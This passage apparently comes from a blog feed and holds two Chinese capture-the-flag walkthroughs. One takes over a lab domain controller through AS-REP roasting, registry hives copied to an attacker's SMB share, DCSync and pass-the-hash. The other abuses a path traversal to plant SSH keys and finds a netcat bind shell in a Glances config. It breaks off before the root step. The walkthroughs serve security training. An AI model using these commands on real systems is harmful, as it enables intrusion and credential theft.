$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:658c87a58d98ac6611635ed17f2dde44$dca073223197802e16eda82933c8edf55b906146cf6eb9ba9e5ff4c3dff4a74d70a91b8787a8a12dd5a85196534f86252203f806f02793903578d5d42c2f4df593c749f6a47f81011356b05caee386f1610848d1a1e92fa79504b988bed455e8e973f720203ac48e13398cd103a0e719bacf3e880591e0aab24a4f191832bb948fe7f5fcd3b17e16302998e592387ae5a25c6c8b8a5566f2b2aa7cd6e26e392c06e7877069df8736662a357aba9edf69cc5b294af97a3af3df6350db9ba829a98ef293de9f10242642e8dab8c55e8024d26c98b7ae9c12a9ff9a0c4afc52f97e765569d0ab540c80505536cade0fce31973c6854507d
```

ÂèëÁé∞Áî®Êà∑`zximena448`Â≠òÂú®AS-REP RoastingÊºèÊ¥ûÔºåËé∑ÂæóKerberosÁ•®ÊçÆÂìàÂ∏å„ÄÇ

## ÂìàÂ∏åÁ†¥Ëß£

‰ΩøÁî®johnÂ∑•ÂÖ∑Á†¥Ëß£AS-REPÂìàÂ∏åÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
...
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)   
...
```

ÊàêÂäüÁ†¥Ëß£ÂØÜÁ†ÅÔºö`zximena448:internet`

# ‰∫î„ÄÅÊùÉÈôêÊèêÂçá

## È™åËØÅÊñ∞Âá≠ÊçÆ

‰ΩøÁî®Êñ∞Ëé∑ÂæóÁöÑÂá≠ÊçÆÊµãËØïÊùÉÈôêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nxc smb 192.168.205.146 -u zximena448 -p internet --shares   
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$          READ            Remote Admin
SMB         192.168.205.146 445    DC01             C$              READ,WRITE      Default share
...
```

zximena448Áî®Êà∑ÂÖ∑ÊúâÊõ¥È´òÊùÉÈôêÔºåÂèØ‰ª•ËÆøÈóÆADMIN$ÂíåC$ÂÖ±‰∫´„ÄÇ

## LDAPËØ¶ÁªÜÊûö‰∏æ

‰ΩøÁî®ldapdomaindumpÂ∑•ÂÖ∑ËøõË°åËØ¶ÁªÜÁöÑLDAP‰ø°ÊÅØÊî∂ÈõÜÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 /usr/lib/python3/dist-packages/ldapdomaindump -u 'SOUPEDECODE.LOCAL\zximena448' -p 'internet' 192.168.205.146
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

ÈÄöËøáÊü•ÁúãÁîüÊàêÁöÑHTMLÊä•ÂëäÔºåÂèëÁé∞zximena448Áî®Êà∑ÊòØ**Backup Operators**ÁªÑÁöÑÊàêÂëò„ÄÇ

## Backup OperatorsÊùÉÈôêÂà©Áî®

Backup OperatorsÊòØWindowsÁöÑÂÜÖÁΩÆÁªÑÔºåËØ•ÁªÑÊàêÂëòÂÖ∑ÊúâSeBackupPrivilegeÁâπÊùÉÔºåÂèØ‰ª•ËØªÂèñÂüüÊéßÂà∂Âô®‰∏äÁöÑÊïèÊÑüÊñá‰ª∂ÔºåÂåÖÊã¨SAMÊï∞ÊçÆÂ∫ì„ÄÇ

### ËÆæÁΩÆSMBÊúçÂä°Âô®

Âú®ÊîªÂáªÊú∫‰∏äÂêØÂä®SMBÊúçÂä°Âô®Êé•Êî∂Â§á‰ªΩÊñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ impacket-smbserver share . -smb2support
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
...
```

### Â§á‰ªΩÊ≥®ÂÜåË°®

Âà©Áî®SeBackupPrivilegeÁâπÊùÉÂ§á‰ªΩSAM„ÄÅSYSTEMÂíåSECURITYÊ≥®ÂÜåË°®Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ impacket-reg 'zximena448:internet@192.168.205.146' backup -o '\\192.168.205.128\share'
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\192.168.205.128\share\SAM.save
[*] Saved HKLM\SYSTEM to \\192.168.205.128\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\192.168.205.128\share\SECURITY.save
```

### ÊèêÂèñÊú¨Âú∞ÂìàÂ∏å

‰ΩøÁî®secretsdumpÂ∑•ÂÖ∑‰ªéÂ§á‰ªΩÁöÑÊ≥®ÂÜåË°®Êñá‰ª∂‰∏≠ÊèêÂèñÂØÜÁ†ÅÂìàÂ∏åÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
...
[*] $MACHINE.ACC 
...
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:aa905227fd1b4142a01a09912606af5c
...
```

Ëé∑ÂæóÊú∫Âô®Ë¥¶Êà∑`DC01$`ÁöÑNTLMÂìàÂ∏åÔºö`aa905227fd1b4142a01a09912606af5c`

## DCSyncÊîªÂáª

### È™åËØÅÊú∫Âô®Ë¥¶Êà∑ÊùÉÈôê

‰ΩøÁî®Êú∫Âô®Ë¥¶Êà∑ÂìàÂ∏åÈ™åËØÅÊùÉÈôêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nxc smb 192.168.205.146 -u 'DC01$' -H 'aa905227fd1b4142a01a09912606af5c' --ntds
[+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.205.146 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
SMB         192.168.205.146 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.205.146 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         192.168.205.146 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
```

ÊàêÂäüÊâßË°åDCSyncÊîªÂáªÔºåËé∑ÂæóÂüüÂÜÖÊâÄÊúâÁî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏åÔºåÂåÖÊã¨ÂüüÁÆ°ÁêÜÂëòAdministratorÁöÑNTLMÂìàÂ∏åÔºö`8982babd4da89d33210779a6c5b078bd`

# ÂÖ≠„ÄÅËé∑ÂèñÂüüÁÆ°ÊùÉÈôê

‰ΩøÁî®ÂüüÁÆ°ÁêÜÂëòÁöÑNTLMÂìàÂ∏åËøõË°åPass-the-HashÊîªÂáªÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ evil-winrm -i 192.168.205.146 -u Administrator -H '8982babd4da89d33210779a6c5b078bd'       
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
soupedecode\administrator
```

ÊàêÂäüËé∑ÂæóÂüüÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇ

## Ëé∑Âèñflag

```bash
*Evil-WinRM* PS C:\Users&gt; type C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e

*Evil-WinRM* PS C:\Users&gt; type C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

# ‰∏É„ÄÅÊîªÂáªÊÄªÁªì

Êú¨Ê¨°Ê∏óÈÄèÊµãËØïÁöÑÊîªÂáªË∑ØÂæÑÂ¶Ç‰∏ãÔºö

1. **‰ø°ÊÅØÊî∂ÈõÜ**ÔºöÈÄöËøáÁ´ØÂè£Êâ´ÊèèÂíåÊúçÂä°Êûö‰∏æÔºåËØÜÂà´ÁõÆÊ†á‰∏∫WindowsÂüüÊéßÂà∂Âô®
2. **Áî®Êà∑Êûö‰∏æ**Ôºö‰ΩøÁî®kerbruteÂ∑•ÂÖ∑Êûö‰∏æÊúâÊïàÂüüÁî®Êà∑
3. **Âá≠ÊçÆËé∑Âèñ**ÔºöÈÄöËøáÂØÜÁ†ÅÂñ∑Ê¥íÊîªÂáªËé∑ÂæócharlieÁî®Êà∑Âá≠ÊçÆ
4. **AS-REP Roasting**ÔºöÂèëÁé∞zximena448Áî®Êà∑Â≠òÂú®KerberosÈ¢ÑËÆ§ËØÅÊºèÊ¥ûÔºåÁ†¥Ëß£Ëé∑ÂæóÂØÜÁ†Å
5. **ÊùÉÈôêÊèêÂçá**ÔºöÂà©Áî®zximena448Áî®Êà∑ÁöÑBackup OperatorsÊùÉÈôêÂ§á‰ªΩÊ≥®ÂÜåË°®
6. **Ê®™ÂêëÁßªÂä®**ÔºöÊèêÂèñÊú∫Âô®Ë¥¶Êà∑ÂìàÂ∏åÔºåÊâßË°åDCSyncÊîªÂáª
7. **ÂüüÁÆ°Êé•ÁÆ°**Ôºö‰ΩøÁî®ÂüüÁÆ°ÁêÜÂëòÂìàÂ∏åËé∑ÂæóÂÆåÂÖ®ÊéßÂà∂ÊùÉÈôê

**ÂÖ≥ÈîÆÁü•ËØÜÁÇπ**Ôºö

- **Backup OperatorsÁªÑ**ÔºöËØ•ÁªÑÊàêÂëòÂÖ∑ÊúâSeBackupPrivilegeÁâπÊùÉÔºåÂèØ‰ª•Â§á‰ªΩÂíåËøòÂéüÊñá‰ª∂ÔºåÂåÖÊã¨ÊïèÊÑüÁöÑÁ≥ªÁªüÊñá‰ª∂
- **AS-REP Roasting**ÔºöÈíàÂØπËÆæÁΩÆ‰∫Ü'‰∏çË¶ÅÊ±ÇKerberosÈ¢ÑËÆ§ËØÅ'Â±ûÊÄßÁöÑÁî®Êà∑Ë¥¶Êà∑ÁöÑÊîªÂáªÊäÄÊúØ
- **DCSyncÊîªÂáª**ÔºöÂà©Áî®ÂüüÊéßÂà∂Âô®ÊùÉÈôêÂêåÊ≠•Êï¥‰∏™ÂüüÊï∞ÊçÆÂ∫ìÁöÑÈ´òÁ∫ßÊîªÂáªÊäÄÊúØ
- **Pass-the-Hash**ÔºöÊó†ÈúÄÊòéÊñáÂØÜÁ†ÅÔºåÁõ¥Êé•‰ΩøÁî®NTLMÂìàÂ∏åËøõË°åË∫´‰ªΩÈ™åËØÅÁöÑÊäÄÊúØsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_DC2.html</guid><pubDate>Thu, 04 Sep 2025 06:25:16 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_ll104567</title><link>https://7r1UMPHK.github.io/post/nei-bu-_ll104567.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1.1 ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÔºåÂú®VMware NATÁΩëÁªúÁéØÂ¢É‰∏ãÔºå‰ΩøÁî®`arp-scan`ËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.156 08:00:27:f9:af:5d       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.156`„ÄÇ

Êé•ÁùÄÔºå‰ΩøÁî®`nmap`ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÊâÄÊúâÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.156
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1045/tcp  open  fpitp
MAC Address: 08:00:27:F9:AF:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†áÂºÄÊîæ‰∫ÜÂ§ö‰∏™Á´ØÂè£ÔºåÂåÖÊã¨SSH(22)„ÄÅHTTP(80)„ÄÅSMB(139, 445)ÊúçÂä°Ôºå‰ª•Âèä‰∏Ä‰∏™ÈùûÂ∏∏ËßÑÁöÑ`1045`Á´ØÂè£„ÄÇ

## 1.2 ÊúçÂä°ÁâàÊú¨Êé¢Êµã

ÂØπÈùûÊ†áÂáÜÁ´ØÂè£`1045`ËøõË°åËØ¶ÁªÜÁöÑÊúçÂä°ÁâàÊú¨Êé¢ÊµãÂíåËÑöÊú¨Êâ´ÊèèÔºå‰ª•‰∫ÜËß£ÂÖ∂ËøêË°åÁöÑÂ∫îÁî®„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p1045 -sC -sV 192.168.205.156
...
PORT     STATE SERVICE VERSION
1045/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-title: 404 Not Found
```

`1045`Á´ØÂè£‰∏äËøêË°åÁöÑÊòØ‰∏Ä‰∏™Âü∫‰∫é`Python Werkzeug`ÁöÑHTTPÊúçÂä°„ÄÇÁõ¥Êé•ËÆøÈóÆÊó∂ËøîÂõû404ÔºåËøôË°®ÊòéÊàë‰ª¨ÈúÄË¶ÅÂØªÊâæÊ≠£Á°ÆÁöÑAPIË∑ØÂæÑÊàñWebÁ´ØÁÇπ„ÄÇ

## 1.3 SMB‰ø°ÊÅØÊûö‰∏æ

Áî±‰∫éÁõÆÊ†áÂºÄÊîæ‰∫ÜSMBÊúçÂä°Ôºå‰ΩøÁî®`enum4linux-ng`ËøõË°åËØ¶ÁªÜÊûö‰∏æÔºåÂØªÊâæÂèØÂà©Áî®ÁöÑ‰ø°ÊÅØÔºåÂ¶ÇÂÖ±‰∫´ÁõÆÂΩïÂíåÂåøÂêçËÆøÈóÆÊùÉÈôê„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ enum4linux-ng -A 192.168.205.156
...
 =========================================
|    Shares via RPC on 192.168.205.156    |
 =========================================
[*] Enumerating shares
[+] Found 3 share(s):
...
user_files:
  comment: User Files Share
  type: Disk
...
[*] Testing share user_files
[+] Mapping: OK, Listing: OK
```

Êûö‰∏æÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `user_files` ÁöÑÂÖ±‰∫´ÁõÆÂΩïÔºåÂπ∂‰∏îÂÖÅËÆ∏ÂåøÂêçËÆøÈóÆÂíåÂàóÂá∫Êñá‰ª∂„ÄÇÂ∞ùËØïËøûÊé•ÂêéÂèëÁé∞ÁõÆÂΩï‰∏∫Á©∫ÔºåÊöÇÊó∂Ê≤°ÊúâÂèëÁé∞ÂèØÂà©Áî®ÁöÑÊñá‰ª∂„ÄÇ

# ‰∫å„ÄÅWebÊúçÂä°Ê∏óÈÄè‰∏éÊºèÊ¥ûÂà©Áî®

## 2.1 Web‰ø°ÊÅØÊé¢Á¥¢

ËÆøÈóÆ`80`Á´ØÂè£ÁöÑHTTPÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™‚ÄúÂêçÂ≠óGayÊåáÊï∞ËÆ°ÁÆóÂô®‚ÄùÁöÑWebÂ∫îÁî®„ÄÇÊü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞‰∏Ä‰∏™Ê≥®ÈáäÊèêÁ§∫ÔºåËøôÂèØËÉΩÊòØÂêéÁª≠ËÆ§ËØÅÁöÑÂÖ≥ÈîÆÂá≠ËØÅ„ÄÇ

```html
&lt;!-- xixilake-session-secure-2025 --&gt;
```

Ëøô‰∏™Ê≥®Èáä `xixilake-session-secure-2025` ÁúãËµ∑Êù•ÂÉè‰∏Ä‰∏™ÂØÜÈí•ÊàñSession‰ª§ÁâåÔºåÊàë‰ª¨Â∞ÜÂÖ∂ËÆ∞ÂΩï‰∏ãÊù•‰ª•Â§áÂêéÁî®„ÄÇ

## 2.2 APIÊé•Âè£Êé¢Á¥¢‰∏éÁ™ÅÁ†¥

ËΩ¨Âêë`1045`Á´ØÂè£ÁöÑWebÊúçÂä°ÔºåÂØπÂÖ∂ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞‰∫Ü`/api`Ë∑ØÂæÑÔºåÂπ∂Ëøõ‰∏ÄÊ≠•Âú®`/api`‰∏ãÊâæÂà∞‰∫Ü`/api/health`Á´ØÁÇπ„ÄÇËÆøÈóÆËØ•Á´ØÁÇπËé∑Âèñ‰∫ÜAPIÁöÑÁªìÊûÑ‰ø°ÊÅØÔºåÂÖ∂‰∏≠ÊúÄÂÖ≥ÈîÆÁöÑÊòØÊåáÊòé‰∫ÜÁî®‰∫éÊñá‰ª∂Êìç‰ΩúÁöÑË∑ØÂæÑÔºö`/api/files/`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl http://192.168.205.156:1045/api/health
{'available_endpoints':{'/api':'API information','/api/files/':'File operations',...}}
```

ÁªìÂêà‰πãÂâçÂèëÁé∞ÁöÑ‰ª§ÁâåÔºåÊàë‰ª¨Êé®Êñ≠ÂÆÉÂèØËÉΩÁî®‰Ωú`X-Session-Token`Â§¥ËøõË°åË∫´‰ªΩËÆ§ËØÅ„ÄÇÈ¶ñÂÖàÔºåÂú®Êú¨Âú∞ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´SSHÂÖ¨Èí•ÁöÑÊñá‰ª∂`authorized_keys`ÔºåÁÑ∂ÂêéÂ∞ùËØïÂà©Áî®Ê≠§‰ª§Áâå‰∏ä‰º†ËØ•Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -X PUT -H 'X-Session-Token: xixilake-session-secure-2025' -T authorized_keys http://192.168.205.156:1045/api/files/authorized_keys
{'message':'File authorized_keys uploaded successfully'}
```

‰∏ä‰º†ÊàêÂäüÔºÅËøôÁ°ÆËÆ§‰∫ÜÊàë‰ª¨Êã•ÊúâÈÄöËøáAPIÂêëÊúçÂä°Âô®ÁâπÂÆöÁõÆÂΩïÂÜôÂÖ•Êñá‰ª∂ÁöÑËÉΩÂäõ„ÄÇ

## 2.3 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥ûÁöÑÂèëÁé∞‰∏éÂà©Áî®

Êó¢ÁÑ∂ÂèØ‰ª•Êìç‰ΩúÊñá‰ª∂Ôºå‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÊµãËØïÊòØÂê¶Â≠òÂú®Ë∑ØÂæÑÈÅçÂéÜÔºàPath TraversalÔºâÊºèÊ¥û„ÄÇÊàë‰ª¨Â∞ùËØïÈÄöËøáÊûÑÈÄ† `../` Â∫èÂàóÊù•ËØªÂèñ‰Ωç‰∫éWebÁõÆÂΩï‰πãÂ§ñÁöÑ `/etc/passwd` Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl --path-as-is 'http://192.168.205.156:1045/api/files/../../../etc/passwd' -H 'X-Session-Token: xixilake-session-secure-2025'
root:x:0:0:root:/root:/bin/bash
...
ll:x:1001:1001::/home/ll:/bin/bash
```

ÊàêÂäüËØªÂèñÔºÅËøôËØÅÊòé‰∫ÜÊºèÊ¥ûÁöÑÂ≠òÂú®ÔºåÂπ∂‰∏îÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊ≠§ÊºèÊ¥ûËé∑Âèñ‰∏Ä‰∏™Âêç‰∏∫`ll`ÁöÑÁî®Êà∑‰ø°ÊÅØ„ÄÇ

### **ÊäÄÊúØÂâñÊûêÔºöÂÆ¢Êà∑Á´ØË∑ØÂæÑËßÑËåÉÂåñ‰∏é`--path-as-is`ÁöÑÈáçË¶ÅÊÄß**

Âú®ËøôÈáåÔºå`--path-as-is`Ê†áÂøóÊòØÊú¨Ê¨°ÊºèÊ¥ûÂà©Áî®ÊàêÂäüÁöÑ**ÂÜ≥ÂÆöÊÄßÂõ†Á¥†**„ÄÇËã•Áº∫Â∞ëÊ≠§Ê†áÂøóÔºåÊó†ËÆ∫ÊòØ‰ΩøÁî®ÊµèËßàÂô®ËøòÊòØÈªòËÆ§ÁöÑ`curl`ÂëΩ‰ª§ÔºåÊîªÂáªÈÉΩ‰ºöÂ§±Ë¥•„ÄÇÂÖ∂Ê†πÊú¨ÂéüÂõ†Âú®‰∫é**ÂÆ¢Êà∑Á´ØË∑ØÂæÑËßÑËåÉÂåñ (Client-Side Path Normalization)**„ÄÇ

1.  **‰∏∫‰ªÄ‰πàÊµèËßàÂô®ÂíåÈªòËÆ§`curl`‰ºöÂ§±Ë¥•Ôºü**
    ÂΩì‰Ω†Âú®ÊµèËßàÂô®Âú∞ÂùÄÊ†èÊàñÊ†áÂáÜÁöÑ`curl`ÂëΩ‰ª§‰∏≠ËæìÂÖ•ÂåÖÂê´ `../` ÁöÑURLÊó∂ÔºåÂÆ¢Êà∑Á´ØÂ∫îÁî®ÔºàÊµèËßàÂô®ÊàñcurlÁ®ãÂ∫èÔºâ‰ºöÂú®ÂèëÈÄÅHTTPËØ∑Ê±Ç**‰πãÂâç**ÔºåÂ∞±‚ÄúÊô∫ËÉΩÂú∞‚ÄùÂØπË∑ØÂæÑËøõË°åÊ∏ÖÁêÜÂíåËßÑËåÉÂåñ„ÄÇ
    *   **ËæìÂÖ•Ë∑ØÂæÑ**: `/api/files/../../../etc/passwd`
    *   **ÂÆ¢Êà∑Á´ØËßÑËåÉÂåñÂêé**: `/etc/passwd`
        ÊúÄÁªàÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÁöÑËØ∑Ê±ÇË∑ØÂæÑÊòØ `/etc/passwd`ÔºåËøô‰∏™Ë∑ØÂæÑ‰∏çÁ¨¶ÂêàÂ∫îÁî®ÁöÑAPIË∑ØÁî±ËßÑÂàôÔºåÂõ†Ê≠§Êó†Ê≥ïËß¶ÂèëÊºèÊ¥ûÔºåÂØºËá¥404ÈîôËØØ„ÄÇ

2.  **‰∏∫‰ªÄ‰πà`--path-as-is`ËÉΩÂ§üÊàêÂäüÔºü**
    Ê≠§ÂèÇÊï∞ÁöÑ‰ΩúÁî®ÊòØÂëäËØâ`curl`**ÂÖ≥Èó≠ÂÖ∂ÈªòËÆ§ÁöÑË∑ØÂæÑËßÑËåÉÂåñÂäüËÉΩ**„ÄÇÂÆÉ‰ºöÂ∞ÜURL‰∏≠ÁöÑË∑ØÂæÑÈÉ®ÂàÜ `../../../etc/passwd` ÂéüÂ∞Å‰∏çÂä®Âú∞ÂèëÈÄÅÁªôÊúçÂä°Âô®„ÄÇÁî±‰∫éÊúçÂä°Á´ØÁöÑPythonÂ∫îÁî®‰ª£Á†ÅÂ≠òÂú®Áº∫Èô∑ÔºåÊ≤°ÊúâÂØπÊé•Êî∂Âà∞ÁöÑË∑ØÂæÑËøõË°åÂÆâÂÖ®Â§ÑÁêÜÔºåÂõ†Ê≠§Áõ¥Êé•ÊãºÊé•Âπ∂ÊâßË°å‰∫ÜÊñá‰ª∂Êìç‰ΩúÔºåÊúÄÁªàÂØºËá¥‰∫ÜÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÁöÑÊàêÂäüÂà©Áî®„ÄÇ

Âà©Áî®Ê≠§ÊºèÊ¥ûÔºåÊàë‰ª¨‰ΩøÁî®`MOVE`ÊñπÊ≥ïÂ∞Ü‰πãÂâç‰∏ä‰º†ÁöÑ`authorized_keys`Êñá‰ª∂ÁßªÂä®Âà∞ÁõÆÊ†áÁî®Êà∑`ll`ÁöÑ`.ssh`ÁõÆÂΩï‰∏ã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -X MOVE -H 'X-Session-Token: xixilake-session-secure-2025' -H 'Destination: ../../../home/ll/.ssh/authorized_keys' http://192.168.205.156:1045/api/files/authorized_keys
{'message':'File moved to ../../../home/ll/.ssh/authorized_keys'}
```

Êñá‰ª∂ÁßªÂä®ÊàêÂäü„ÄÇÁé∞Âú®Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáSSHÂÖçÂØÜÁôªÂΩï`ll`Áî®Êà∑„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 3.1 Ëé∑ÂèñÂàùÂßãShell

Âà©Áî®Â∑≤ÂÜôÂÖ•ÁöÑSSHÂÖ¨Èí•ÔºåÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫ÔºåËé∑Âèñ‰ΩéÊùÉÈôêshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh ll@192.168.205.156
...
ll@104567:~$ id
uid=1001(ll) gid=1001(ll) groups=1001(ll)
```

ÊàêÂäüËé∑Âèñ‰∫Ü`ll`Áî®Êà∑ÁöÑshell„ÄÇ

## 3.2 SudoÊùÉÈôêÂàÜÊûê

Ê£ÄÊü•ÂΩìÂâçÁî®Êà∑ÁöÑ`sudo`ÊùÉÈôêÔºåÂØªÊâæÊèêÊùÉÁ∫øÁ¥¢„ÄÇ

```bash
ll@104567:~$ sudo -l
...
User ll may run the following commands on 104567:
    (ALL : ALL) NOPASSWD: /usr/bin/toilet
```

ÂèëÁé∞`ll`Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å`/usr/bin/toilet`ÂëΩ‰ª§ÔºåËøô‰∏™ÂëΩ‰ª§ÊòØÂÖîÂ≠êÊ¥û„ÄÇ

## 3.3 ÂèëÁé∞È´òÊùÉÈôêÊúçÂä°ÔºöGlances

Âú®ÁõÆÊ†á‰∏ªÊú∫‰∏äÔºå‰ΩøÁî®`ss -tnlp`Êü•ÁúãÁΩëÁªúËøûÊé•ÊÉÖÂÜµÔºåÂØªÊâæÂèØËÉΩÁî±È´òÊùÉÈôêÁî®Êà∑ÂêØÂä®ÁöÑ„ÄÅÊú™Ë¢´Â§ñÁΩëÊâ´ÊèèÂèëÁé∞ÁöÑÊúçÂä°„ÄÇ

```bash
ll@104567:~$ ss -tnlp
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
...
LISTEN   0        128              0.0.0.0:61208          0.0.0.0:*
...
```

ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑ`61208`Á´ØÂè£Ê≠£Âú®ÁõëÂê¨„ÄÇÂõûÂà∞KaliÔºåÊâ´ÊèèËØ•Á´ØÂè£ÔºåÁ°ÆËÆ§ÂÖ∂ËøêË°åÁùÄ‰∏Ä‰∏™`Glances`Á≥ªÁªüÁõëÊéßÊúçÂä°ÔºåÂπ∂‰∏îÈÄöËøáÁõÆÂΩïÊâ´ÊèèÂíåËÆøÈóÆ`/openapi.json`ÔºåÁ°ÆËÆ§ËøôÊòØ‰∏Ä‰∏™APIÁâàÊú¨‰∏∫V4ÁöÑGlancesÊúçÂä°„ÄÇ

## 3.4 ÈÖçÁΩÆÊñá‰ª∂‰ø°ÊÅØÊ≥ÑÈú≤‰∏éÂëΩ‰ª§ÊâßË°åÊºèÊ¥û

Ê†πÊçÆAPIÊñáÊ°£Ôºå`/api/4/config`Á´ØÁÇπÂ≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÂèØ‰ª•ËØªÂèñGlancesÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl http://192.168.205.156:61208/api/4/config | jq
{
  'fs': {
    'warning': '80',
    'warning_action': 'busybox nc -lp 4567 -e /bin/bash',
    'careful': '50',
    'critical': '90'
  },
...
}
```

ÈÖçÁΩÆÊñá‰ª∂‰∏≠Â≠òÂú®‰∏Ä‰∏™Ëá¥ÂëΩÁöÑÈÖçÁΩÆÈ°π`warning_action`„ÄÇÂΩìÊñá‰ª∂Á≥ªÁªü‰ΩøÁî®ÁéáËææÂà∞80%Êó∂ÔºåÁî±‰∫éGlancesÊúçÂä°ÊòØ‰ª•rootÊùÉÈôêËøêË°åÁöÑÔºåÁ≥ªÁªü‰ºö‰ª•**rootÊùÉÈôê**ÊâßË°åÈ¢ÑËÆæÂëΩ‰ª§`busybox nc -lp 4567 -e /bin/bash`Ôºå‰ªéËÄåÂºÄÂêØ‰∏Ä‰∏™ÁõëÂê¨Âú®4567Á´ØÂè£ÁöÑÁªëÂÆöÂûãshell„ÄÇ

## 3.5 Ëß¶ÂèëÊºèÊ¥ûÂπ∂Ëé∑ÂèñRoot Shell

